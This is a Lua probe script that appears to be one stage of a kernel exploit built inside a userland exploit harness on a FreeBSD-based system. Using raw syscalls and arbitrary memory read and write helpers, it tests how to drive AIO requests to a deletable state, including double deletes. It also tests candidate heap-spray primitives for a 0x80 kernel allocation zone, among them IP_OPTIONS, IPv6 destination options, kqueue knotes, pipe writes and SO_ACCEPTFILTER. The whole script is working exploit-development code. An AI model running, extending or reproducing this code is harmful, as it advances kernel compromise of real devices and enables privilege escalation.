-- CRASH_CLASS: LOW
-- PROBE 555b: Two blockers from 555a
--
-- PART 1: AIO lifecycle — make requests reach terminal state so delete works
--   1a) Write data to peer → read completes → state=3 → delete
--   1b) Close peer → read errors → state=4 → delete
--   1c) Cancel + poll loop until state=4 → delete
--
-- PART 2: Alternative 0x80 UMA zone spray primitives
--   2a) setsockopt(SO_SNDBUF/SO_RCVBUF) — int-valued, test works at all
--   2b) setsockopt(IPV6_TCLASS) — simple int sanity check on IPv6 socket
--   2c) setsockopt(IP_OPTIONS) on AF_INET — variable-length, classic spray
--   2d) pipe + write sized data — pipe buffer chunks
--   2e) kqueue knote registration — each EVFILT_READ creates ~0x78 knote
--   2f) POSIX shm objects — shm_open creates a named kernel object
--   2g) setsockopt(SO_LINGER) multi-socket tag readback — can we use this?
--   2h) sendmsg SCM_RIGHTS ancillary — kernel copies cmsg
--   2i) setsockopt(LOCAL_CREDS) on AF_UNIX — variable-length credential opt
--   2j) IPV6_DSTOPTS with smaller sizes (8, 16, 24) — maybe 120 was too big
--   2k) setsockopt IP level options on AF_INET (IP_OPTIONS=1)

print("=== PROBE 555b: SPRAY ALTERNATIVES + AIO LIFECYCLE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local sc_socket     = mk(97)
local sc_close      = mk(6)
local sc_setsockopt = mk(105)
local sc_getsockopt = mk(118)
local sc_socketpair = mk(135)
local sc_write      = mk(4)
local sc_pipe       = mk(542)  -- FreeBSD pipe2
local sc_kqueue     = mk(362)
local sc_kevent     = mk(363)
local sc_shm_open   = mk(482)
local sc_aio_submit = mk(669)
local sc_aio_delete = mk(662)
local sc_aio_poll   = mk(664)
local sc_aio_cancel = mk(666)
local sc_aio_wait   = mk(663)

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

-- ================================================================
-- PART 1: AIO LIFECYCLE — reach terminal state then delete
-- ================================================================
print("")
print("========== PART 1: AIO LIFECYCLE ==========")

local function aio_submit_one(fd, buf, nbytes)
    local req = memory.alloc(0x30)
    wq(req + 0x00, uint64(0))
    wq(req + 0x08, uint64(nbytes))
    wq(req + 0x10, uint64(buf))
    wq(req + 0x18, uint64(0))
    wd(req + 0x20, fd)
    wd(req + 0x24, 0)
    local ids = memory.alloc(8)
    wd(ids, 0)
    local ok, v = pcall(function()
        return sc_aio_submit(uint64(0x1001), uint64(req), uint64(1),
            uint64(3), uint64(ids))
    end)
    return (ok and N(v) or -999), rd(ids), ids
end

local function aio_poll_one(ids_ptr)
    local st = memory.alloc(8)
    wd(st, 0)
    pcall(function() sc_aio_poll(uint64(ids_ptr), uint64(1), uint64(st)) end)
    return rd(st)
end

local function aio_delete_one(ids_ptr)
    local errs = memory.alloc(8)
    wd(errs, 0x99999999)
    local ok, v = pcall(function()
        return sc_aio_delete(uint64(ids_ptr), uint64(1), uint64(errs))
    end)
    return (ok and N(v) or -999), rd(errs)
end

-- 1a: Write data to peer → read completes
print("")
print("--- 1a: Write to peer → complete read ---")
do
    local sv = memory.alloc(16)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
    local fd_r = rd(sv)
    local fd_w = rd(sv + 4)
    local buf = memory.alloc(0x100)

    local sret, aid, ids_ptr = aio_submit_one(fd_r, buf, 0x100)
    print("submit=" .. sret .. " id=" .. (aid or "nil"))

    local s1 = aio_poll_one(ids_ptr)
    print("poll before write: state=" .. (s1 or "nil"))

    -- Write data to peer to complete the read
    local wbuf = memory.alloc(0x100)
    wd(wbuf, 0xDEADBEEF)
    pcall(function() sc_write(uint64(fd_w), uint64(wbuf), uint64(0x100)) end)

    -- Small busy-wait for completion
    local s2 = nil
    for i = 1, 20 do
        s2 = aio_poll_one(ids_ptr)
        if s2 and s2 >= 3 then break end
    end
    print("poll after write: state=" .. (s2 or "nil") .. " (3=completed)")

    if s2 == 3 then
        local dret, derr = aio_delete_one(ids_ptr)
        print("delete: ret=" .. dret .. " err=" .. string.format("0x%08X", derr or 0))
        if derr == 0 then
            print(">>> DELETE AFTER COMPLETION: SUCCESS")
        end

        -- Double delete — should fail
        local dret2, derr2 = aio_delete_one(ids_ptr)
        print("double delete: ret=" .. dret2 .. " err=" ..
            string.format("0x%08X", derr2 or 0))
    end

    pcall(function() sc_close(uint64(fd_r)) end)
    pcall(function() sc_close(uint64(fd_w)) end)
end

-- 1b: Close peer → read errors
print("")
print("--- 1b: Close peer → error read ---")
do
    local sv = memory.alloc(16)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
    local fd_r = rd(sv)
    local fd_w = rd(sv + 4)
    local buf = memory.alloc(0x100)

    local sret, aid, ids_ptr = aio_submit_one(fd_r, buf, 0x100)
    print("submit=" .. sret .. " id=" .. (aid or "nil"))

    -- Close writing peer
    pcall(function() sc_close(uint64(fd_w)) end)

    local s2 = nil
    for i = 1, 20 do
        s2 = aio_poll_one(ids_ptr)
        if s2 and s2 >= 3 then break end
    end
    print("poll after close peer: state=" .. (s2 or "nil"))

    local dret, derr = aio_delete_one(ids_ptr)
    print("delete: ret=" .. dret .. " err=" .. string.format("0x%08X", derr or 0))

    pcall(function() sc_close(uint64(fd_r)) end)
end

-- 1c: Cancel + wait loop
print("")
print("--- 1c: Cancel + poll loop ---")
do
    local sv = memory.alloc(16)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
    local fd_r = rd(sv)
    local fd_w = rd(sv + 4)
    local buf = memory.alloc(0x100)

    local sret, aid, ids_ptr = aio_submit_one(fd_r, buf, 0x100)
    print("submit=" .. sret .. " id=" .. (aid or "nil"))

    -- Cancel
    local cst = memory.alloc(8)
    wd(cst, 0)
    pcall(function() sc_aio_cancel(uint64(ids_ptr), uint64(1), uint64(cst)) end)
    print("cancel state=" .. (rd(cst) or "nil"))

    -- Close peer to unblock
    pcall(function() sc_close(uint64(fd_w)) end)

    -- Poll until terminal
    local final = nil
    for i = 1, 50 do
        final = aio_poll_one(ids_ptr)
        if final and final >= 3 then break end
    end
    print("final state=" .. (final or "nil"))

    local dret, derr = aio_delete_one(ids_ptr)
    print("delete: ret=" .. dret .. " err=" .. string.format("0x%08X", derr or 0))

    pcall(function() sc_close(uint64(fd_r)) end)
end

-- 1d: SO_LINGER + batch (the gist's exact shape)
print("")
print("--- 1d: SO_LINGER batch (gist shape) ---")
do
    local BATCH = 4
    local scratch = memory.alloc(0x1000)
    local fds_r = {}
    local fds_w = {}
    local sv = memory.alloc(16)

    for i = 1, BATCH do
        pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
        fds_r[i] = rd(sv)
        fds_w[i] = rd(sv + 4)
        -- SO_LINGER on read fd
        local lg = memory.alloc(8)
        wd(lg, 1); wd(lg + 4, 1)
        pcall(function()
            sc_setsockopt(uint64(fds_r[i]), uint64(0xFFFF), uint64(0x80),
                uint64(lg), uint64(8))
        end)
    end

    -- Build request array
    local reqs = memory.alloc(BATCH * 0x28 + 16)
    for i = 0, BATCH - 1 do
        local base = reqs + i * 0x28
        wq(base + 0x00, uint64(0))
        wq(base + 0x08, uint64(0x1000))
        wq(base + 0x10, uint64(scratch))
        wq(base + 0x18, uint64(0))
        wd(base + 0x20, fds_r[i + 1])
        wd(base + 0x24, 0)
    end

    local ids = memory.alloc(BATCH * 4 + 16)
    for i = 0, BATCH - 1 do wd(ids + i * 4, 0) end

    pcall(function()
        sc_aio_submit(uint64(0x1001), uint64(reqs), uint64(BATCH),
            uint64(3), uint64(ids))
    end)

    local id_strs = {}
    for i = 0, BATCH - 1 do
        id_strs[#id_strs + 1] = tostring(rd(ids + i * 4) or 0)
    end
    print("ids: " .. table.concat(id_strs, ", "))

    -- Cancel
    local cstates = memory.alloc(BATCH * 4 + 16)
    pcall(function()
        sc_aio_cancel(uint64(ids), uint64(BATCH), uint64(cstates))
    end)

    -- Close ALL peers to unblock
    for i = 1, BATCH do
        pcall(function() sc_close(uint64(fds_w[i])) end)
    end

    -- Poll until all terminal
    local attempts = 0
    local all_done = false
    for try = 1, 100 do
        attempts = try
        local states = memory.alloc(BATCH * 4 + 16)
        pcall(function()
            sc_aio_poll(uint64(ids), uint64(BATCH), uint64(states))
        end)
        all_done = true
        for i = 0, BATCH - 1 do
            local s = rd(states + i * 4)
            if not s or s < 3 then all_done = false; break end
        end
        if all_done then
            local st_strs = {}
            for i = 0, BATCH - 1 do
                st_strs[#st_strs + 1] = tostring(rd(states + i * 4) or 0)
            end
            print("terminal states: " .. table.concat(st_strs, ", ") ..
                " (attempts=" .. attempts .. ")")
            break
        end
    end

    if all_done then
        -- DELETE
        local errs = memory.alloc(BATCH * 4 + 16)
        for i = 0, BATCH - 1 do wd(errs + i * 4, 0x99999999) end
        local ok, v = pcall(function()
            return sc_aio_delete(uint64(ids), uint64(BATCH), uint64(errs))
        end)
        local err_strs = {}
        for i = 0, BATCH - 1 do
            err_strs[#err_strs + 1] = string.format("0x%08X", rd(errs + i * 4) or 0)
        end
        print("delete ret=" .. (ok and N(v) or "err") ..
            " errs: " .. table.concat(err_strs, ", "))

        -- SECOND DELETE (should fail)
        for i = 0, BATCH - 1 do wd(errs + i * 4, 0x99999999) end
        pcall(function()
            sc_aio_delete(uint64(ids), uint64(BATCH), uint64(errs))
        end)
        local err2_strs = {}
        for i = 0, BATCH - 1 do
            err2_strs[#err2_strs + 1] = string.format("0x%08X", rd(errs + i * 4) or 0)
        end
        print("2nd delete errs: " .. table.concat(err2_strs, ", ") ..
            " (expect error)")
    else
        print("NOT ALL TERMINAL after " .. attempts .. " polls")
    end

    for i = 1, BATCH do
        pcall(function() sc_close(uint64(fds_r[i])) end)
    end
end

-- ================================================================
-- PART 2: SPRAY PRIMITIVES
-- ================================================================
print("")
print("========== PART 2: SPRAY ALTERNATIVES ==========")

-- Helper: create IPv6 DGRAM socket
local function mk6()
    local ok, v = pcall(function()
        return sc_socket(uint64(28), uint64(2), uint64(0))
    end)
    return ok and N(v) or -1
end

-- Helper: create AF_INET DGRAM socket
local function mk4()
    local ok, v = pcall(function()
        return sc_socket(uint64(2), uint64(2), uint64(0))
    end)
    return ok and N(v) or -1
end

-- 2a: setsockopt sanity — basic int options
print("")
print("--- 2a: Basic setsockopt ---")
do
    local fd6 = mk6()
    local fd4 = mk4()
    local ibuf = memory.alloc(8)

    local tests = {}
    -- IPv6 options
    if fd6 >= 0 then
        -- IPV6_TCLASS(61)
        wd(ibuf, 128)
        local ok, v = pcall(function()
            return sc_setsockopt(uint64(fd6), uint64(41), uint64(61),
                uint64(ibuf), uint64(4))
        end)
        tests[#tests+1] = "IPV6_TCLASS=" .. (ok and N(v) or "err")

        -- IPV6_UNICAST_HOPS(4)
        wd(ibuf, 64)
        ok, v = pcall(function()
            return sc_setsockopt(uint64(fd6), uint64(41), uint64(4),
                uint64(ibuf), uint64(4))
        end)
        tests[#tests+1] = "IPV6_UNICAST_HOPS=" .. (ok and N(v) or "err")
    end

    -- AF_INET options
    if fd4 >= 0 then
        -- SO_SNDBUF
        wd(ibuf, 65536)
        local ok, v = pcall(function()
            return sc_setsockopt(uint64(fd4), uint64(0xFFFF), uint64(0x1001),
                uint64(ibuf), uint64(4))
        end)
        tests[#tests+1] = "SO_SNDBUF=" .. (ok and N(v) or "err")

        -- SO_RCVBUF
        wd(ibuf, 65536)
        ok, v = pcall(function()
            return sc_setsockopt(uint64(fd4), uint64(0xFFFF), uint64(0x1002),
                uint64(ibuf), uint64(4))
        end)
        tests[#tests+1] = "SO_RCVBUF=" .. (ok and N(v) or "err")
    end

    print(table.concat(tests, " | "))
    if fd6 >= 0 then pcall(function() sc_close(uint64(fd6)) end) end
    if fd4 >= 0 then pcall(function() sc_close(uint64(fd4)) end) end
end

-- 2b: IPV6_DSTOPTS with small sizes
print("")
print("--- 2b: DSTOPTS small sizes ---")
do
    local fd6 = mk6()
    if fd6 >= 0 then
        local buf = memory.alloc(256)
        local sizes = {8, 16, 24, 32, 48, 64}
        for _, sz in ipairs(sizes) do
            -- Build minimal valid DSTOPTS header
            for i = 0, sz - 1, 4 do wd(buf + i, 0) end
            local hdr_len = math.floor(sz / 8) - 1
            -- byte0=nxt(0), byte1=hdr_len, byte2=PadN(1), byte3=datalen
            local padn_len = sz - 4
            wd(buf, hdr_len * 0x100 + 0x10000 + padn_len * 0x1000000)

            local ok, v = pcall(function()
                return sc_setsockopt(uint64(fd6), uint64(41), uint64(50),
                    uint64(buf), uint64(sz))
            end)
            local r = ok and N(v) or -999
            -- Also try HOPOPTS
            local ok2, v2 = pcall(function()
                return sc_setsockopt(uint64(fd6), uint64(41), uint64(49),
                    uint64(buf), uint64(sz))
            end)
            local r2 = ok2 and N(v2) or -999
            print("sz=" .. sz .. " DSTOPTS=" .. r .. " HOPOPTS=" .. r2)
        end

        -- Also try with optlen=0 (delete sticky option)
        local ok3, v3 = pcall(function()
            return sc_setsockopt(uint64(fd6), uint64(41), uint64(50),
                uint64(0), uint64(0))
        end)
        print("DSTOPTS optlen=0: " .. (ok3 and N(v3) or "err"))

        pcall(function() sc_close(uint64(fd6)) end)
    else
        print("no IPv6 socket")
    end
end

-- 2c: IP_OPTIONS on AF_INET (classic spray)
print("")
print("--- 2c: IP_OPTIONS (AF_INET) ---")
do
    local fd4 = mk4()
    if fd4 >= 0 then
        local buf = memory.alloc(128)
        -- IP options: max 40 bytes. Try various sizes for the 0x80 zone
        -- IP_OPTIONS = 1
        local sizes = {4, 8, 20, 40}
        for _, sz in ipairs(sizes) do
            for i = 0, sz - 1, 4 do wd(buf + i, 0x01010101) end  -- NOP options
            wd(buf, 0x01010101)  -- NOP NOP NOP NOP
            local ok, v = pcall(function()
                return sc_setsockopt(uint64(fd4), uint64(0), uint64(1),
                    uint64(buf), uint64(sz))
            end)
            print("IP_OPTIONS sz=" .. sz .. " ret=" .. (ok and N(v) or "err"))
        end

        -- Readback
        local rbuf = memory.alloc(64)
        local rlen = memory.alloc(8)
        wd(rlen, 44)
        local ok, v = pcall(function()
            return sc_getsockopt(uint64(fd4), uint64(0), uint64(1),
                uint64(rbuf), uint64(rlen))
        end)
        local retlen = rd(rlen)
        print("IP_OPTIONS read: ret=" .. (ok and N(v) or "err") ..
            " len=" .. (retlen or "nil"))

        pcall(function() sc_close(uint64(fd4)) end)
    else
        print("no AF_INET socket")
    end
end

-- 2d: Pipe buffer
print("")
print("--- 2d: Pipe ---")
do
    local pv = memory.alloc(16)
    -- pipe2(542) or pipe(42)
    local ok, v = pcall(function()
        return mk(42)(uint64(pv))  -- pipe(42)
    end)
    local ret = ok and N(v) or -999
    if ret < 0 then
        -- Try pipe2(542)
        ok, v = pcall(function()
            return mk(542)(uint64(pv), uint64(0))
        end)
        ret = ok and N(v) or -999
    end
    local pr = rd(pv)
    local pw = rd(pv + 4)
    print("pipe: ret=" .. ret .. " r=" .. (pr or "nil") .. " w=" .. (pw or "nil"))

    if ret >= 0 and pw and pw >= 0 then
        -- Write various sizes — pipe buffers are kernel allocations
        local wbuf = memory.alloc(0x200)
        for i = 0, 0x1FF, 4 do wd(wbuf + i, 0xAABBCCDD) end
        local sizes = {64, 80, 120, 128, 256}
        for _, sz in ipairs(sizes) do
            local ok2, v2 = pcall(function()
                return sc_write(uint64(pw), uint64(wbuf), uint64(sz))
            end)
            print("pipe write " .. sz .. "B: " .. (ok2 and N(v2) or "err"))
        end
        pcall(function() sc_close(uint64(pr)) end)
        pcall(function() sc_close(uint64(pw)) end)
    end
end

-- 2e: kqueue knote spray
print("")
print("--- 2e: kqueue knote ---")
do
    local ok, v = pcall(function() return mk(362)() end)  -- kqueue
    local kq = ok and N(v) or -1
    print("kqueue=" .. kq)

    if kq >= 0 then
        -- Register multiple EVFILT_TIMER events — each creates a knote
        -- struct kevent = {ident, filter, flags, fflags, data, udata} = 32 bytes
        -- EV_ADD=1, EVFILT_TIMER=-7
        local kev = memory.alloc(64)
        local count = 0
        for i = 1, 20 do
            wq(kev + 0, uint64(i))            -- ident
            wd(kev + 8, 0x0001FFF9)           -- filter=-7(EVFILT_TIMER) | flags=EV_ADD(1) LE: 0xFFF9 0x0001
            -- Actually: filter is int16 at +8, flags is uint16 at +10
            -- EVFILT_TIMER = -7 = 0xFFF9 (int16)
            -- EV_ADD = 0x0001
            -- In LE: bytes [8,9]=0xF9,0xFF  [10,11]=0x01,0x00
            wd(kev + 8, 0x0001FFF9)
            wd(kev + 12, 0)                   -- fflags
            wq(kev + 16, uint64(60000))       -- data = 60s timer (won't fire)
            wq(kev + 24, uint64(0xBB000000 + i))  -- udata = tag

            local ok2, v2 = pcall(function()
                return mk(363)(uint64(kq), uint64(kev), uint64(1),
                    uint64(0), uint64(0))  -- changelist, nchanges, eventlist=0, nevents=0
            end)
            local r = ok2 and N(v2) or -999
            if r >= 0 then count = count + 1
            else print("  kevent #" .. i .. " ret=" .. r); break end
        end
        print("registered " .. count .. " timer knotes")

        -- Delete them
        for i = 1, count do
            wq(kev + 0, uint64(i))
            wd(kev + 8, 0x0002FFF9)  -- EV_DELETE=0x0002 | EVFILT_TIMER
            wd(kev + 12, 0)
            pcall(function()
                mk(363)(uint64(kq), uint64(kev), uint64(1), uint64(0), uint64(0))
            end)
        end
        pcall(function() sc_close(uint64(kq)) end)
    end
end

-- 2f: Multi-socket setsockopt tag readback (SO_LINGER is only 8 bytes though)
print("")
print("--- 2f: SO_LINGER multi-socket (small but controllable) ---")
do
    -- SO_LINGER is only 8 bytes — too small for 0x80 zone. But let's confirm
    -- multi-socket tag isolation works for oracle pattern
    local fds = {}
    for i = 1, 5 do
        local ok, v = pcall(function()
            return sc_socket(uint64(2), uint64(2), uint64(0))
        end)
        if ok and N(v) >= 0 then fds[i] = N(v) end
    end
    print("sockets: " .. #fds)

    -- Set different linger values as "tags"
    for i = 1, #fds do
        local lg = memory.alloc(8)
        wd(lg, 1); wd(lg + 4, 100 + i)
        pcall(function()
            sc_setsockopt(uint64(fds[i]), uint64(0xFFFF), uint64(0x80),
                uint64(lg), uint64(8))
        end)
    end

    -- Read back
    local ok_all = true
    for i = 1, #fds do
        local rb = memory.alloc(8)
        local rl = memory.alloc(8); wd(rl, 8)
        pcall(function()
            sc_getsockopt(uint64(fds[i]), uint64(0xFFFF), uint64(0x80),
                uint64(rb), uint64(rl))
        end)
        local tag = rd(rb + 4)
        if tag ~= 100 + i then ok_all = false end
    end
    print("tag isolation: " .. (ok_all and "PERFECT" or "BROKEN"))

    for i = 1, #fds do pcall(function() sc_close(uint64(fds[i])) end) end
end

-- 2g: setsockopt with larger variable-length options on AF_INET
print("")
print("--- 2g: AF_INET SOCK_RAW IP_OPTIONS ---")
do
    -- Try SOCK_RAW which might accept more options
    local ok, v = pcall(function()
        return sc_socket(uint64(2), uint64(3), uint64(255))  -- SOCK_RAW, IPPROTO_RAW
    end)
    local fd_raw = ok and N(v) or -1
    print("raw socket = " .. fd_raw)

    if fd_raw >= 0 then
        local buf = memory.alloc(64)
        for i = 0, 43, 4 do wd(buf + i, 0x01010101) end
        local ok2, v2 = pcall(function()
            return sc_setsockopt(uint64(fd_raw), uint64(0), uint64(1),
                uint64(buf), uint64(40))
        end)
        print("IP_OPTIONS 40B on RAW: " .. (ok2 and N(v2) or "err"))

        -- Try SO_ACCEPTFILTER (0x1000) — variable length, used in some exploits
        local afbuf = memory.alloc(256)
        for i = 0, 127, 4 do wd(afbuf + i, 0x41414141) end  -- fill with 'A'
        local ok3, v3 = pcall(function()
            return sc_setsockopt(uint64(fd_raw), uint64(0xFFFF), uint64(0x1000),
                uint64(afbuf), uint64(128))
        end)
        print("SO_ACCEPTFILTER 128B: " .. (ok3 and N(v3) or "err"))

        pcall(function() sc_close(uint64(fd_raw)) end)
    end
end

-- 2h: IPv6 PKTINFO and other variable options
print("")
print("--- 2h: More IPv6 options ---")
do
    local fd6 = mk6()
    if fd6 >= 0 then
        local buf = memory.alloc(256)
        -- Try various IPv6 option numbers that might accept variable data
        -- IPV6_PATHMTU(44), IPV6_USE_MIN_MTU(42), IPV6_DONTFRAG(62)
        -- IPV6_PKTINFO(46) — struct in6_pktinfo = 20 bytes
        local opts = {
            {name="PKTINFO(46)", num=46, sz=20},
            {name="NEXTHOP(48)", num=48, sz=28},  -- struct sockaddr_in6
            {name="TCLASS(61)",  num=61, sz=4},
            {name="USE_MIN_MTU(42)", num=42, sz=4},
            {name="DONTFRAG(62)", num=62, sz=4},
            {name="PREFER_TEMPADDR(63)", num=63, sz=4},
        }
        for _, opt in ipairs(opts) do
            for i = 0, opt.sz - 1, 4 do wd(buf + i, 0) end
            if opt.sz == 4 then wd(buf, 1) end
            local ok, v = pcall(function()
                return sc_setsockopt(uint64(fd6), uint64(41), uint64(opt.num),
                    uint64(buf), uint64(opt.sz))
            end)
            print(opt.name .. " = " .. (ok and N(v) or "err"))
        end
        pcall(function() sc_close(uint64(fd6)) end)
    end
end

-- 2i: Scan for any variable-length setsockopt that takes 0x80 range
print("")
print("--- 2i: AF_UNIX SO options scan ---")
do
    local sv = memory.alloc(16)
    pcall(function() sc_socketpair(uint64(1), uint64(1), uint64(0), uint64(sv)) end)
    local fd = rd(sv)
    if fd and fd >= 0 then
        local buf = memory.alloc(256)
        for i = 0, 127, 4 do wd(buf + i, 0) end
        -- LOCAL_CREDS(2), LOCAL_CONNWAIT(4), LOCAL_PEERCRED(1)
        local unix_opts = {
            {name="LOCAL_PEERCRED", num=1, sz=68},   -- struct xucred
            {name="LOCAL_CREDS", num=2, sz=4},
            {name="LOCAL_CONNWAIT", num=4, sz=4},
        }
        for _, opt in ipairs(unix_opts) do
            wd(buf, 1)
            local ok, v = pcall(function()
                return sc_setsockopt(uint64(fd), uint64(0), uint64(opt.num),
                    uint64(buf), uint64(opt.sz))
            end)
            print(opt.name .. "(" .. opt.num .. ") = " .. (ok and N(v) or "err"))
        end
        pcall(function() sc_close(uint64(fd)) end)
        pcall(function() sc_close(uint64(rd(sv + 4))) end)
    end
end

print("")
print("=== 555b COMPLETE ===")
print("ALIVE")
